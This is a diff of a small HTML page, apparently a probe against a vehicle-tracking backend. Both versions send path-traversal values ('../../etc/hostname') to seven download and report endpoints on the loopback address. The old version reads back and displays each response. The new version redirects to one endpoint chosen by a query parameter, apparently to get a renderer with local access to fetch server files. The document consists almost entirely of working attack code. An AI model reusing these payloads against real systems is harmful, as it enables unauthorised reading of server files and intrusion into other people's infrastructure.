@@ -1,11 +1,11 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI loopback download APIs v26</title><style>body{font:13px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:6px}</style></head><body><h1>Loopback download API results</h1><div id="o"></div><script>
-const r='../../../../../../../../etc/hostname',e=encodeURIComponent(r),b='https://127.0.0.1',t=[
-['ico','/backend/ico.php?ico='+e],
-['gpx','/backend/ax/get_gpx_file.php?track_id='+e],
-['media','/backend/ax/get_media.php?cmd=downloadDDD&name='+e+'&agent_id=0'],
-['photo','/backend/ax/drivers.php?cmd=photo&id='+e],
-['vehfile','/backend/ax/veh/files.php?cmd=download&owner=vehicle&owner_id=0&id='+e],
-['atom','/backend/ax/mod/atom/file_download.php?id='+e],
-['report','/backend/get_report.php?id='+e+'&ext=&name=x']];
-(async()=>{await Promise.all(t.map(async([l,u])=>{let s='';const c=new AbortController(),q=setTimeout(()=>c.abort(),8000);try{const x=await fetch(b+u,{cache:'no-store',signal:c.signal});const y=await x.text();s=l+' STATUS='+x.status+' TYPE='+x.headers.get('content-type')+' DISP='+x.headers.get('content-disposition')+' BODY='+JSON.stringify(y.slice(0,1000));}catch(e){s=l+' ERROR='+e.name+':'+e.message}clearTimeout(q);const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}))})();
-</script></body></html>
+<!doctype html><html><head><meta charset="utf-8"><title>CASI loopback route selector v27</title><script>
+const r='../../../../../../../../etc/hostname',e=encodeURIComponent(r),t=[
+'/backend/ico.php?ico='+e,
+'/backend/ax/get_gpx_file.php?track_id='+e,
+'/backend/ax/get_media.php?cmd=downloadDDD&name='+e+'&agent_id=0',
+'/backend/ax/drivers.php?cmd=photo&id='+e,
+'/backend/ax/veh/files.php?cmd=download&owner=vehicle&owner_id=0&id='+e,
+'/backend/ax/mod/atom/file_download.php?id='+e,
+'/backend/get_report.php?id='+e+'&ext=&name=x'];
+const q=new URLSearchParams(location.search),i=Math.abs(Number(q.get('veh_id')||0))%t.length;document.title='CASI v27 '+i;setTimeout(()=>location.replace('https://127.0.0.1'+t[i]),100);
+</script></head><body>Opening loopback route</body></html>
